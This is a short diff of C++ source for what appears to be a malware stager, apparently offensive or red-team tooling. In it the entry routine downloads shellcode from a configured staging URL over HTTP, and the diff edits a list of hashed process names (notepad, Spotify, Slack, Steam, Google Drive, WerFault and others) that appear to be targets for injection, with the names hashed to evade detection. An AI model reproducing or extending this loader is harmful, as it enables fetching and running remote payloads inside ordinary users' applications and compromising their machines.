@@ -41,7 +41,7 @@ VOID entry(void)
 	PBYTE downloaded_shellcode = NULL;
 	SIZE_T shellcode_size = NULL;
 
-	if (!malapi::DownloadShellcode(STAGER_URL, STAGER_FILE, STAGER_SSL, &downloaded_shellcode, &shellcode_size))
+	if (!malapi::StageShellcodeHttp(STAGER_URL, STAGER_FILE, STAGER_SSL, &downloaded_shellcode, &shellcode_size))
 	{
 		LOG_ERROR("Failed to download shellcode.");
 		return;
@@ -82,12 +82,16 @@ VOID entry(void)
 	constexpr ULONG targets[] = {
 		malapi::HashStringFowlerNollVoVariant1a("notepad.exe"), // dev win 10
 		malapi::HashStringFowlerNollVoVariant1a("Notepad.exe"), // dev win 11
-		malapi::HashStringFowlerNollVoVariant1a("Discord.exe"),
+		malapi::HashStringFowlerNollVoVariant1a("Spotify.exe"),
 		malapi::HashStringFowlerNollVoVariant1a("slack.exe"),
 		malapi::HashStringFowlerNollVoVariant1a("PerfWatson2.exe"),
+		malapi::HashStringFowlerNollVoVariant1a("SteelSeriesGG.exe"),
+		malapi::HashStringFowlerNollVoVariant1a("GoogleDriveFS.exe"),
+		malapi::HashStringFowlerNollVoVariant1a("steamwebhelper.exe"),
 		malapi::HashStringFowlerNollVoVariant1a("slpwow64.exe"),
 		malapi::HashStringFowlerNollVoVariant1a("sihost.exe"),
 		malapi::HashStringFowlerNollVoVariant1a("msiexec.exe"),
+		malapi::HashStringFowlerNollVoVariant1a("WerFault.exe"),
 		malapi::HashStringFowlerNollVoVariant1a("werfault.exe"),
 		malapi::HashStringFowlerNollVoVariant1a("devenv.exe"),
 		malapi::HashStringFowlerNollVoVariant1a("cloudflared.exe"),
